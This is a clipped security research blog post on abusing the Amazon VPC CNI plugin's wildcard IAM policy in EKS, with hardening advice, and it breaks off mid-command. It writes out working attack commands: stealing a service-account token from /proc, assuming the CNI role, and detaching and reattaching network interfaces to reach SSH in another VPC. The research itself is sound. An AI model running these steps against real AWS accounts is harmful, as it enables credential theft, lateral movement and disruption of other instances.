---
title: Abusing Amazon VPC CNI plugin for Kubernetes - elttam
source: https://www.elttam.com/blog/amazon-vpc-cni
source_host: www.elttam.com
clip_date: 2026-09-18T10:45:27+08:00
trace_id: cb99187e-ae18-4692-ab22-799fbec46059
content_hash: 24772698defe4b35924815e947b016c3672615a9e0ceb6f943af9d33abbfc417
status: synced
tags:
  - 漏洞分析
  - Kubernetes安全
series: null
feed_source: elttam
ai_summary: 攻击者只要拿到 EKS 集群内一个立足点，就能借 VPC CNI 插件的 IAM 权限操纵账号内任意 EC2 网卡，打通其它 VPC 的 SSH 服务。
ai_summary_style: key-points
images_status:
  total: 4
  succeeded: 4
  failed_urls: []
notion_page_id: 3df75244-d011-81ee-83eb-ebb1a3555323
ioc:
  cves: []
  cwes: []
  hashes:
    - cb912bf39473470b5730f264f661a525
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 攻击者只要拿到 EKS 集群内一个立足点，就能借 VPC CNI 插件的 IAM 权限操纵账号内任意 EC2 网卡，打通其它 VPC 的 SSH 服务。
> 
> - **默认权限过宽：** 节点组实例角色附带 `AmazonEKS_CNI_Policy`，其 `Resource: '*'` 且无条件限制，允许对全账号 EC2 执行创建/挂载/卸载网卡、修改网卡属性、分配私有 IP 等操作。
> - **插件并未消失：** 控制台与 `eksctl get addons` 显示未安装任何 addon，但 `kubectl get -n kube-system ds/aws-node` 显示 DaemonSet 实际在跑，镜像为 `amazon-k8s-cni`。
> - **横向思路：** 选中目标 VPC 内带公网 EIP 的网卡（无主可用或 `DeviceIndex > 0` 的从属网卡），先 `detach-network-interface`，再 `attach-network-interface --device-index 1` 挂到目标实例上，即可从 EKS 容器访问另一 VPC 的 22 端口，代价是打断原实例流量。
> - **加固项：** 用 IRSA 让 CNI 使用专属角色（仅 OIDC 联合可扮演），并设置 `disableIMDSv1`、`disablePodIMDS` 阻断 Pod 取节点角色；但节点上取得 root 后仍可从 `/proc/$(pidof aws-vpc-cni)/root/var/run/secrets/...` 窃取 ServiceAccount token，配合 `AWS_WEB_IDENTITY_TOKEN_FILE` 冒充 CNI 角色，攻击依旧成立。
> - **结论建议：** 防容器逃逸、收窄 IAM 策略范围、收紧安全组缺一不可。

## Introduction

Would you expect an Amazon EKS cluster to be able to manipulate the networking of other EC2 instances, unrelated to the cluster, even those in other VPCs?While considering the attack surface exposed for Amazon EKS, we investigated the Amazon VPC CNI plugin for Kubernetes, and identified methods to abuse the plugin to manipulate networking to our advantage.This allows an attacker with a foothold in an EKS cluster to expose and potentially exploit services in other VPCs.

In this post we’ll look at the plugin, what its running environment looks like, and then explore ways it can be both hardened and attacked.

## What is Amazon VPC CNI Plugin for Kubernetes?

[Amazon VPC CNI Plugin for Kubernetes](https://docs.aws.amazon.com/eks/latest/userguide/managing-vpc-cni.html) is a network plugin for Kubernetes.Built on the [Container Network Interface](https://www.cni.dev/) (CNI) specification, the plugin provides the fundamental networking requirements of Kubernetes, allowing networking between an Elastic Kubernetes Service (EKS) cluster and an Amazon Virtual Private Cloud (VPC) network.This also allows for it to leverage existing AWS VPC features such as VPC flow logs.

Each EC2 node in the cluster runs the plugin, which creates and attaches [Elastic Network Interfaces](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-eni.html) (ENIs) to the nodes, and assigns a private IP address to the ENIs; effectively wiring them to each pod and service within the cluster.

By default, Amazon EKS installs the Amazon VPC CNI plugin for Kubernetes when creating an EKS cluster.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f8aaa72243efcdb5.avif)

## How does Amazon VPC CNI Plugin for Kubernetes Work?

To investigate how the Amazon VPC CNI Plugin for Kubernetes works we will setup a cluster following the [Getting started with Amazon EKS](https://docs.aws.amazon.com/eks/latest/userguide/getting-started-eksctl.html) guide.This guide uses [eksctl](https://eksctl.io/), a simple command line utility for creating and managing Kubernetes clusters on Amazon EKS.

We ran `eksctl create cluster --name bdawgs-cluster --version 1.27`, this leverages [CloudFormation](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/Welcome.html) [stacks](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/stacks.html) to create the resources needed for the EKS cluster.

Typically Amazon VPC CNI Plugin (also known as `aws-node`) is enabled via [Amazon EKS add-ons](https://docs.aws.amazon.com/eks/latest/userguide/eks-add-ons.html).The documentation, the web console, and [eksctl](https://eksctl.io/usage/addon-upgrade/) state `aws-node` is installed by default, however in our lab looking at the console no addons are shown as installed.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9b55ddb2e0a13008.avif)

Checking using the `eksctl` CLI:

```
% eksctl get addons --cluster bdawgs-cluster --profile research
2023-05-12 13:24:41 [ℹ]  Kubernetes version '1.27' in use by cluster 'bdawgs-cluster'
2023-05-12 13:24:41 [ℹ]  getting all addons
No addons found
```

Both the console and the `eksctl` command output show no addons are installed, contrary to the documentation.Below in this post we will clear the confusion when we explore the Kubernetes resources.

### Investigating AWS Resources

The `eksctl` tool has created several AWS resources for our EKS cluster, most notably:

-   An EKS [managed node group](https://docs.aws.amazon.com/eks/latest/userguide/managed-node-groups.html) `ng-bb239c8d`.A managed node group automates the provisioning and lifecycle of worker nodes (EC2 instances) for the EKS cluster.
-   The node group uses an [Auto Scaling Group (ASG)](https://docs.aws.amazon.com/autoscaling/ec2/userguide/what-is-amazon-ec2-auto-scaling.html).
-   The ASG uses a [launch template](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-launch-templates.html?icmpid=docs_ec2_console) for creating the EC2 instances.
-   The launch template specifies the [instance profile](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_switch-role-ec2_instance-profiles.html), which maps which [IAM](https://docs.aws.amazon.com/IAM/latest/UserGuide/introduction.html) [role](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles.html) to attach to the EC2 instance.

So in our case, `eksctl` created the `eksctl-bdawgs-cluster-nodegroup-n-NodeInstanceRole-LF3CF9WVQ0CX` IAM role for the `ng-bb239c8d` node group, configured as follows:

```json
{
  'Role': {
    'Path': '/',
    'RoleName': 'eksctl-bdawgs-cluster-nodegroup-n-NodeInstanceRole-LF3CF9WVQ0CX',
    'AssumeRolePolicyDocument': {
      'Version': '2012-10-17',
      'Statement': [
        {
          'Effect': 'Allow',
          'Principal': {
            'Service': 'ec2.amazonaws.com'
          },
          'Action': 'sts:AssumeRole'
        }
      ]
    },
    'Description': '',
    'MaxSessionDuration': 3600,
  }
}
```

The `AssumeRolePolicyDocument` field in the role defines the role’s trust policy, effectively controlling which principals can assume this role.In this case, it can be assumed by EC2 instances that have the role attached via an instance profile.AWS IAM Roles can have [managed policies](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_managed-vs-inline.html#aws-managed-policies) attached to them, which defines the permissions the role has.

The `eksctl-bdawgs-cluster-nodegroup-n-NodeInstanceRole-LF3CF9WVQ0CX` role has the following managed policies attached:

```json
{
  'AttachedPolicies': [
    {
      'PolicyName': 'AmazonSSMManagedInstanceCore',
      'PolicyArn': 'arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore'
    },
    {
      'PolicyName': 'AmazonEKS_CNI_Policy',
      'PolicyArn': 'arn:aws:iam::aws:policy/AmazonEKS_CNI_Policy'
    },
    {
      'PolicyName': 'AmazonEC2ContainerRegistryReadOnly',
      'PolicyArn': 'arn:aws:iam::aws:policy/AmazonEC2ContainerRegistryReadOnly'
    },
    {
      'PolicyName': 'AmazonEKSWorkerNodePolicy',
      'PolicyArn': 'arn:aws:iam::aws:policy/AmazonEKSWorkerNodePolicy'
    }
  ]
}
```

This includes the AWS managed policy `AmazonEKS_CNI_Policy`, being the most interesting for our research.The purpose of this managed policy is for the Amazon VPC CNI plugin, see [AmazonEKS_CNI_Policy](https://docs.aws.amazon.com/aws-managed-policy/latest/reference/AmazonEKS_CNI_Policy.html).

The `AmazonEKS_CNI_Policy` managed policy is defined as:

```json
{
  'Version': '2012-10-17',
  'Statement': [
    {
      'Effect': 'Allow',
      'Action': [
        'ec2:AssignPrivateIpAddresses',
        'ec2:AttachNetworkInterface',
        'ec2:CreateNetworkInterface',
        'ec2:DeleteNetworkInterface',
        'ec2:DescribeInstances',
        'ec2:DescribeTags',
        'ec2:DescribeNetworkInterfaces',
        'ec2:DescribeInstanceTypes',
        'ec2:DetachNetworkInterface',
        'ec2:ModifyNetworkInterfaceAttribute',
        'ec2:UnassignPrivateIpAddresses'
      ],
      'Resource': '*'
    },
    {
      'Effect': 'Allow',
      'Action': [
        'ec2:CreateTags'
      ],
      'Resource': [
        'arn:aws:ec2:*:*:network-interface/*'
      ]
    }
  ]
}
```

Due to the wild card `'Resource': '*'` and lack of any restricting conditions, the policy allows manipulating the EC2 networking of all EC2 instances, not just those in the node groups for the EKS cluster that was created with `eksctl` …

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/877034d1528623d9.avif)

### Exploring Kubernetes Resources

Shifting our attention to Kubernetes resources, the Amazon VPC CNI plugin for Kubernetes creates a [DaemonSet](https://kubernetes.io/docs/concepts/workloads/controllers/daemonset/) called `aws-node`.

Looking at the running workloads, we can see:

```
% kubectl get -n kube-system ds/aws-node
NAME       DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR   AGE
aws-node   2         2         2       2            2           <none>          59m
```

So the add-on is installed and running, despite not being listed in the output of `eksctl get addons` nor in the console.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/250b8e1ccb8e480c.avif)

We can describe this `aws-node` daemonset to get more information.

```
Name:           aws-node
Selector:       k8s-app=aws-node
<--SNIP-->
Pod Template:
  Labels:           app.kubernetes.io/instance=aws-vpc-cni
                    app.kubernetes.io/name=aws-node
                    k8s-app=aws-node
  Service Account:  aws-node
```

From the above we can see it uses the `aws-node` [service account](https://kubernetes.io/docs/concepts/security/service-accounts/).

## Attacking from a Compromised Kubernetes Node

With an understanding of AWS and Kubernetes resources related to an EKS cluster, and considering these default settings, it allows an attacker with a foothold in an EKS cluster (e.g. via a container escape) to gain access to the IAM role bound to the EKS node group ([T1552.005](https://attack.mitre.org/techniques/T1552/005/)).This can be seen with the command `aws sts get-caller-identity | jq .`, below:

```json
{
  'UserId': 'AROASBRZIQA25IBJANDWY:i-072b1b34312ac543e',
  'Account': '123456789012',
  'Arn': 'arn:aws:sts::123456789012:assumed-role/eksctl-bdawgs-cluster-nodegroup-n-NodeInstanceRole-LF3CF9WVQ0CX/i-072b1b34312ac543e'
}
```

First, the attacker can use the [kubelet](https://kubernetes.io/docs/concepts/overview/components/#kubelet) ’s authentication, which is based off the node group’s IAM role, in order to communicate with the Kubernetes [API Server](https://kubernetes.io/docs/concepts/overview/components/#kube-apiserver).However, the attacker can connect directly to the [containerd](https://containerd.io/) socket too, to investigate the running containers.Using [containerd/nerdctl](https://github.com/containerd/nerdctl) it’s possible to look at the containers running in the containerd `k8s.io` namespace:

```bash
# nerdctl -n k8s.io ps
IMAGE                                                                                 COMMAND                  NAMES
602401143452.dkr.ecr-fips.us-east-1.amazonaws.com/eks/pause:3.5                       '/pause'                 k8s://kube-system/aws-node-b4nxh
602401143452.dkr.ecr-fips.us-east-1.amazonaws.com/eks/kube-proxy:v1.27.1-minimal      'kube-proxy --v=2 --…'   k8s://kube-system/kube-proxy-zp4rk/kube-proxy
602401143452.dkr.ecr-fips.us-east-1.amazonaws.com/amazon-k8s-cni:v1.12.6-eksbuild.2   '/app/aws-vpc-cni'       k8s://kube-system/aws-node-b4nxh/aws-node <1>
602401143452.dkr.ecr-fips.us-east-1.amazonaws.com/eks/pause:3.5                       '/pause'                 k8s://kube-system/kube-proxy-zp4rk
```

This shows the `kube-system/aws-node-b4nxh` pod is running the `/app/aws-vpc-cni` command at <1>.Using the node group’s IAM permissions we have, we can enumerate the running EC2 instances, thanks to the `ec2:DescribeInstances` permission.

```bash
aws ec2 describe-instances | \
jq '.Reservations | map(.Instances | first | {id: .InstanceId, name: (.Tags | map(select(.Key == 'Name')) | first.Value)})'
```

```json
[
  {
    'id': 'i-07ff89b6da1bd69ac',
    'name': 'crystal-palace'
  },
  {
    'id': 'i-00b6f3d04edb25ce0',
    'name': 'Gibson'
  },
  {
    'id': 'i-0ebdf97ea808b5e8d',
    'name': 'bdawgs-cluster-ng-c5c4cbe5-Node'
  },
  {
    'id': 'i-0d03314ed68c71b4d',
    'name': 'bdawgs-cluster-ng-c5c4cbe5-Node'
  }
]
```

This lists several instances, however with its lax permissions it’s possible to see instances outside of our EC2 cluster, which for the purpose of this blog post have been spun up as part of our lab setup.Grabbing the IP address for the ‘Gibson’ instance via `aws ec2 describe-instances --filters Name=tag:Name,Values=Gibson | jq -r '.Reservations | first.Instances | first.PrivateIpAddress'` and testing connectivity (e.g. ping, SSH, etc.) shows it’s not reachable.

If we check what VPC this instance is in:

```
aws ec2 describe-instances --filters Name=tag:Name,Values=Gibson | jq -r '.Reservations | first.Instances | first.VpcId'
vpc-04c866bad3463f17d
```

and compare to the VPC the EKS cluster is in:

```bash
TOKEN=`curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'` && \
curl -H 'X-aws-ec2-metadata-token: $TOKEN' -s http://169.254.169.254/latest/meta-data/network/interfaces/macs/0a:86:01:a1:70:36/vpc-id; echo
vpc-0bf2b47fbe677d151
```

In our test lab, the `Gibson` instance is living in a different VPC.However, as VPCs cannot talk to each other without VPC peering, there’s no network reachability and we have inadequate privileges to influence that.

There is an alternative method however:

1.  Find a network interface (ENI) that is publicly accessible over the Internet.
2.  If there’s no unattached ENIs, we can detach one - albeit this is disruptive.
3.  Attach the ENI to the target EC2 instance.

In EC2 it is only possible to attach ENIs that exist in the same VPC as the instance, which is why we are restricting the search to the same VPC as the `Gibson` instance.The default interface cannot be detached, only the secondary, which is why we will only look for secondary interfaces.This can be identified by filtering attached interfaces with an index greater than 0.

The node group’s IAM role is leveraged to perform the whole attack - beginning with enumerating network interfaces and security-groups in order to find an appropriate ENI, and then detach/attach network interfaces.

Running the following command demonstrates listing all network interfaces in the same VPC as the `Gibson` EC2 instance, with elastic IP addresses, and also extracts the details of their attachment and security groups.

```bash
aws ec2 describe-network-interfaces | \
jq '.NetworkInterfaces |
  map(select(.VpcId == 'vpc-04c866bad3463f17d')) |
  map({
    eni: .NetworkInterfaceId,
    description: .Description,
    status: .Status,
    attachment: {id: .Attachment.AttachmentId, status: .Attachment.Status, instance: .Attachment.InstanceId, idx: .Attachment.DeviceIndex},
    eip: .Association.PublicIp,
    groups: .Groups
  }) |
  map(select(.eip and (.status == 'available' or .attachment.idx > 0)))'
```

```json
[
  {
    'eni': 'eni-046d62cc526269d39',
    'description': 'bdawg-test',
    'status': 'available',
    'attachment': {
      'id': null,
      'status': null,
      'instance': null,
      'idx': null
    },
    'eip': '13.238.208.136',
    'groups': [
      {
        'GroupName': 'default',
        'GroupId': 'sg-0f1c617e150c599a2'
      }
    ]
  },
  {
    'eni': 'eni-033442a4519624e92',
    'description': '',
    'status': 'in-use',
    'attachment': {
      'id': 'eni-attach-09c1284aadf66de7d',
      'status': 'attached',
      'instance': 'i-07ff89b6da1bd69ac',
      'idx': 1
    },
    'eip': '13.239.46.100',
    'groups': [
      {
        'GroupName': 'launch-wizard-2',
        'GroupId': 'sg-0a92e040142ab4847'
      }
    ]
  }
]
```

This list shows two candidate interfaces we could target.The first `eni-046d62cc526269d39` is `available` as it is not attached to an instance.The second `eni-033442a4519624e92` is `in-use` as it is attached to an instance.

Looking at the first candidate’s security group `sg-0f1c617e150c599a2` with the command: `aws ec2 describe-security-groups --group-id sg-0f1c617e150c599a2 | jq '.SecurityGroups | map({GroupId, GroupName, IpPermissions})'`:

```json
[
  {
    'GroupId': 'sg-0f1c617e150c599a2',
    'GroupName': 'default',
    'IpPermissions': [
      {
        'IpProtocol': '-1',
        'IpRanges': [],
        'Ipv6Ranges': [],
        'PrefixListIds': [],
        'UserIdGroupPairs': [
          {
            'GroupId': 'sg-0f1c617e150c599a2',
            'UserId': '140780273717'
          }
        ]
      }
    ]
  }
]
```

This shows it only allows traffic from the same security group, which rules it out since it’d forbid access from our EKS cluster.

Looking at the second candidate’s security group, with the command `aws ec2 describe-security-groups --group-id sg-0a92e040142ab4847 | jq '.SecurityGroups | map({GroupId, GroupName, IpPermissions})'`:

```json
[
  {
    'GroupId': 'sg-0a92e040142ab4847',
    'GroupName': 'launch-wizard-2',
    'IpPermissions': [
      {
        'FromPort': 22,
        'IpProtocol': 'tcp',
        'IpRanges': [
          {
            'CidrIp': '0.0.0.0/0'
          }
        ],
        'Ipv6Ranges': [],
        'PrefixListIds': [],
        'ToPort': 22,
        'UserIdGroupPairs': []
      }
    ]
  }
]
```

This shows the security group allows traffic from the Internet on TCP port 22 (SSH), which would allow connectivity from our EKS cluster.As this interface is in use though, we will need to detach it, which is going to be intrusive and disrupt traffic to the original instance.To detach the interface, the command `aws ec2 detach-network-interface --attachment-id eni-attach-09c1284aadf66de7d` can be run, which has no output.

To attach the interface to the Gibson EC2 instance `i-00b6f3d04edb25ce0`, the command `aws ec2 attach-network-interface --device-index 1 --instance-id i-00b6f3d04edb25ce0 --network-interface-id eni-033442a4519624e92` can be used:

```json
{
    'AttachmentId': 'eni-attach-058e6cbab431ba42c'
}
```

Now, it’s possible to reach the SSH service in another VPC from the EKS container:

```
[ec2-user@ip-192-168-13-79 ~]$ ssh 13.239.46.100
The authenticity of host '13.239.46.100 (13.239.46.100)' can't be established.
ECDSA key fingerprint is SHA256:jgipXcKUvTOKAnJRwBejcwMH15kDNjViVPa2OxA1QQ4.
ECDSA key fingerprint is MD5:be:a1:77:97:96:40:69:0c:30:29:85:9a:4b:69:60:f4.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '13.239.46.100' (ECDSA) to the list of known hosts.
```

This attack can be used to expose internal sensitive services or any service that may expose vulnerabilities in another VPC, and consequently be leveraged to move laterally to other VPCs in the AWS account.

## Hardening the defaults

With looking at attacking the default configuration out of the way, it’s worth considering how Amazon EKS can be hardened to see if this attack would still be feasible.

The [Security in Amazon EKS](https://docs.aws.amazon.com/eks/latest/userguide/security.html) documentation leans on security *in* the cloud is the customer’s responsibility.This means customers need to follow best practices such as ensuring workloads follow the least privilege principle by having individual IAM roles.Workloads should use their dedicated IAM roles that cannot easily assume other roles, such as from those for other workloads, or more general or more powerful roles, such as any role associated with the node group.

This is typically enforced by blocking access to the instance metadata service (IMDS), which will prevent workloads from elevating privileges by getting the node’s role from IMDS.This also helps to avoid workloads having a permissive one size fits all permissions with things like `'Resource': '*'`.

### IAM Roles for Service Accounts

In the beginning there were popular open source solutions such as [jtblin/kube2iam](https://github.com/jtblin/kube2iam) and [uswitch/kiam](https://github.com/uswitch/kiam).Then EKS [introduced](https://aws.amazon.com/blogs/opensource/introducing-fine-grained-iam-roles-service-accounts/) fine-grained access control [IAM roles for service accounts](https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts.html) (IRSA).The corresponding eksctl documentation is [here](https://eksctl.io/usage/iamserviceaccounts/).

### AWS IAM Policy Hardening

The AWS IAM policy itself can have its scope reduced.The aws/amazon-vpc-cni-k8s repository documentation includes a section [Scope-down IAM policy per EKS cluster](https://github.com/aws/amazon-vpc-cni-k8s/blob/master/docs/iam-policy.md#scope-down-iam-policy-per-eks-cluster).

The eksctl documentation includes [Minimum IAM policies](https://eksctl.io/usage/minimum-iam-policies/) and [IAM permissions boundary](https://eksctl.io/usage/iam-permissions-boundary/).

### Evaluating a hardened EKS cluster

How are things on a cluster with hardening applied?To answer this we created a new cluster with IAM Roles for Service Accounts (IRSA) enabled based off the [example configuration](https://eksctl.io/usage/iamserviceaccounts/) and also blocked pods access to IMDS with this configuration:

```yaml
# An example of ClusterConfig with IAMServiceAccounts:
---
apiVersion: eksctl.io/v1alpha5
kind: ClusterConfig

metadata:
  name: bdawgs-irsa-cluster
  region: ap-southeast-2
  version: '1.27'

iam:
  # Enable OpenID Connect needed by IAM Roles for Service Accounts (IRSA)
  withOIDC: true
  # Configure service accounts, and IAM role's policies, for IRSA
  serviceAccounts:
  - metadata:
      name: s3-reader
      # if no namespace is set, 'default' will be used;
      # the namespace will be created if it doesn't exist already
      namespace: backend-apps
      labels: {aws-usage: 'application'}
    attachPolicyARNs:
    - 'arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess'
    tags:
      Owner: 'John Doe'
      Team: 'Some Team'
  - metadata:
      name: cache-access
      namespace: backend-apps
      labels: {aws-usage: 'application'}
    attachPolicyARNs:
    - 'arn:aws:iam::aws:policy/AmazonDynamoDBReadOnlyAccess'
    - 'arn:aws:iam::aws:policy/AmazonElastiCacheFullAccess'
  - metadata:
      name: cluster-autoscaler
      namespace: kube-system
      labels: {aws-usage: 'cluster-ops'}
    wellKnownPolicies:
      autoScaler: true
    roleName: eksctl-cluster-autoscaler-role
    roleOnly: true
  - metadata:
      name: some-app
      namespace: default
    attachRoleARN: arn:aws:iam::123:role/already-created-role-for-app
managedNodeGroups:
  - name: 'ng-1'
    tags:
      # EC2 tags required for cluster-autoscaler auto-discovery
      k8s.io/cluster-autoscaler/enabled: 'true'
      k8s.io/cluster-autoscaler/bdawgs-irsa-cluster: 'owned'
    desiredCapacity: 1
    minSize: 1
    maxSize: 1
    # Explicitly disable IMDSv1, requiring the use of IMDSv2 tokens
    disableIMDSv1: true
    # Block all IMDS requests from non-host networking pods
    disablePodIMDS: true
    ssh:
      allow: true
      publicKeyName: ben-elttam
```

Now, workloads won’t be able to get the node group instance’s IAM role (`eksctl-bdawgs-irsa-cluster-nodegr-NodeInstanceRole-CV1T75DAR35O`) from the IMDS, and would have their own dedicated IAM roles if required.So they wouldn’t be able to use the Amazon VPC CNI plugin’s IAM role (`eksctl-bdawgs-irsa-cluster-addon-iamservicea-Role1-11MGRBEKHYG91`) to manipulate the networking of other EC2 instances.

If we `diff` the attached policies of the old node group instance’s role (`eksctl-bdawgs-cluster-nodegroup-n-NodeInstanceRole-LF3CF9WVQ0CX`) to the new node group instance’s role (`eksctl-bdawgs-irsa-cluster-nodegr-NodeInstanceRole-CV1T75DAR35O`) we can see that the new node group instance’s IAM role no longer has the Amazon VPC CNI managed policy (`AmazonEKS_CNI_Policy`) attached.

```
8,11d7
<       'PolicyName': 'AmazonEKS_CNI_Policy',
<       'PolicyArn': 'arn:aws:iam::aws:policy/AmazonEKS_CNI_Policy'
<     },
<     {
```

There is now a dedicated role for the Amazon VPC CNI plugin, `eksctl-bdawgs-irsa-cluster-addon-iamservicea-Role1-11MGRBEKHYG91`.

```json
{
  'Role': {
    'Path': '/',
    'RoleName': 'eksctl-bdawgs-irsa-cluster-addon-iamservicea-Role1-11MGRBEKHYG91',
    'RoleId': 'AROASBRZIQA2QOC25YDS4',
    'Arn': 'arn:aws:iam::123456789012:role/eksctl-bdawgs-irsa-cluster-addon-iamservicea-Role1-11MGRBEKHYG91',
    'CreateDate': '2023-05-17T20:24:06+00:00',
    'AssumeRolePolicyDocument': {
      'Version': '2012-10-17',
      'Statement': [
        {
          'Effect': 'Allow',
          'Principal': {
            'Federated': 'arn:aws:iam::123456789012:oidc-provider/oidc.eks.ap-southeast-2.amazonaws.com/id/CB912BF39473470B5730F264F661A525'
          },
          'Action': 'sts:AssumeRoleWithWebIdentity',
          'Condition': {
            'StringEquals': {
              'oidc.eks.ap-southeast-2.amazonaws.com/id/CB912BF39473470B5730F264F661A525:aud': 'sts.amazonaws.com',
              'oidc.eks.ap-southeast-2.amazonaws.com/id/CB912BF39473470B5730F264F661A525:sub': 'system:serviceaccount:kube-system:aws-node'
            }
          }
        }
      ]
    },
    'Description': '',
    'MaxSessionDuration': 3600
  }
}
```

This role can only be assumed by federated access via the EKS OpenID Connect identity provider, and only has the `AmazonEKS_CNI_Policy` managed policy attached:

```json
{
  'AttachedPolicies': [
    {
      'PolicyName': 'AmazonEKS_CNI_Policy',
      'PolicyArn': 'arn:aws:iam::aws:policy/AmazonEKS_CNI_Policy'
    }
  ]
}
```

Things are looking a lot more locked down.However, assuming an attacker has gained a foothold on an EKS cluster and escaped a container and gained root access on the worker node, it’s possible to access all the pods running on the host.

The Amazon VPC CNI plugin workload is running in the `aws-node` daemonset, running the `amazon-k8s-cni` container, which is running the `aws-vpc-cni` process.Because we have root privileges we are able to read the service account token from the volume mounted in the container’s file system via the root directory of the process in the `/proc` file system.

This token can be passed to `kubectl` to authenticate as the service account.Using `kubectl auth can-i --list` we can query the actions that we can perform with this service account:

```bash
kubectl --token=$(sudo cat /proc/$(pidof aws-vpc-cni)/root/var/run/secrets/kubernetes.io/serviceaccount/token) auth can-i --list
```

```css
Resources                                       Non-Resource URLs                     Resource Names   Verbs
events                                          []                                    []               [create patch list]
events.events.k8s.io                            []                                    []               [create patch list]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
nodes                                           []                                    []               [list watch get update]
namespaces                                      []                                    []               [list watch get]
pods                                            []                                    []               [list watch get]
eniconfigs.crd.k8s.amazonaws.com                []                                    []               [list watch get]
*.extensions                                    []                                    []               [list watch]
```

This is an alternative technique to obtain the service account of a workload to the one described in [An Trinh’s blog post](https://blog.calif.io/p/privilege-escalation-in-eks), where our method does not rely on communicating to the API Server.

Leveraging the access to the containers’ service account tokens it’s trivial to authenticate to AWS to obtain access to the IAM role assigned to the service.To do this we can use the `aws` CLI with the `AWS_ROLE_ARN` and `AWS_WEB_IDENTITY_TOKEN_FILE` environment variables set to the correct values:

```bash
AWS_ROLE_ARN=arn:aws:iam::123456789012:role/eksctl-bdawgs-irsa-cluster-addon-iamservicea-Role1-11MGRBEKHYG91 \
AWS_WEB_IDENTITY_TOKEN_FILE=<(sudo cat /proc/$(pidof aws-vpc-cni)/root/var/run/secrets/eks.amazonaws.com/serviceaccount/token) \
aws sts get-caller-identity | jq
```

```json
{
  'UserId': 'AROASBRZIQA2QOC25YDS4:botocore-session-1684361176',
  'Account': '123456789012',
  'Arn': 'arn:aws:sts::123456789012:assumed-role/eksctl-bdawgs-irsa-cluster-addon-iamservicea-Role1-11MGRBEKHYG91/botocore-session-1684361176'
}
```

From here, an attacker can perform the same network manipulation attacks shown earlier, with some minor changes to use the right role `eksctl-bdawgs-irsa-cluster-addon-iamservicea-Role1-11MGRBEKHYG91` to perform the various actions.

First, we are able to use the `ec2:DescribeNetworkInterfaces` action allowed by the managed policy `AmazonEKS_CNI_Policy`, on this role:

```bash
AWS_ROLE_ARN=arn:aws:iam::123456789012:role/eksctl-bdawgs-irsa-cluster-addon-iamservicea-Role1-11MGRBEKHYG91 \
AWS_WEB_IDENTITY_TOKEN_FILE=<(sudo cat /proc/$(pidof aws-vpc-cni)/root/var/run/secrets/eks.amazonaws.com/serviceaccount/token) \
aws ec2 describe-network-interfaces | \
jq '.NetworkInterfaces |
  map(select(.VpcId == 'vpc-04c866bad3463f17d')) |
  map({
    eni: .NetworkInterfaceId,
    description: .Description,
    status: .Status,
    attachment: {id: .Attachment.AttachmentId, status: .Attachment.Status, instance: .Attachment.InstanceId, idx: .Attachment.DeviceIndex},
    eip: .Association.PublicIp,
    groups: .Groups
  }) |
  map(select(.eip and (.status == 'available' or .attachment.idx > 0)))'
```

```json
[
  {
    'eni': 'eni-0b0187f4302169cf8',
    'description': '',
    'status': 'in-use',
    'attachment': {
      'id': 'eni-attach-068553077d7f2c97a',
      'status': 'attached',
      'instance': 'i-050e262502e2e02a3',
      'idx': 1
    },
    'eip': '3.105.189.248',
    'groups': [
      {
        'GroupName': 'launch-wizard-2',
        'GroupId': 'sg-0a92e040142ab4847'
      }
    ]
  }
]
```

We have found a candidate interface `eni-0b0187f4302169cf8`, so lets check the security group `sg-0a92e040142ab4847` associated with this interface:

```bash
aws ec2 describe-security-groups --group-id sg-0a92e040142ab4847 | jq '.SecurityGroups | map({GroupId, GroupName, IpPermissions})'
```

```json
[
  {
    'GroupId': 'sg-0a92e040142ab4847',
    'GroupName': 'launch-wizard-2',
    'IpPermissions': [
      {
        'FromPort': 22,
        'IpProtocol': 'tcp',
        'IpRanges': [
          {
            'CidrIp': '0.0.0.0/0'
          }
        ],
        'Ipv6Ranges': [],
        'PrefixListIds': [],
        'ToPort': 22,
        'UserIdGroupPairs': []
      }
    ]
  }
]
```

This shows the ENI’s security group allows SSH (TCP/22) access from anywhere (`0.0.0.0/0`), which allows us connectivity.We then detach it from the existing EC2 instance:

```bash
AWS_ROLE_ARN=arn:aws:iam::123456789012:role/eksctl-bdawgs-irsa-cluster-addon-iamservicea-Role1-11MGRBEKHYG91 \
AWS_WEB_IDENTITY_TOKEN_FILE=<(sudo cat /proc/$(pidof aws-vpc-cni)/root/var/run/secrets/eks.amazonaws.com/serviceaccount/token) \
aws ec2 detach-network-interface --attachment-id eni-attach-068553077d7f2c97a
```

Then we attach it to the Gibson EC2 instance `i-0a497dbf67612ec22`:

```bash
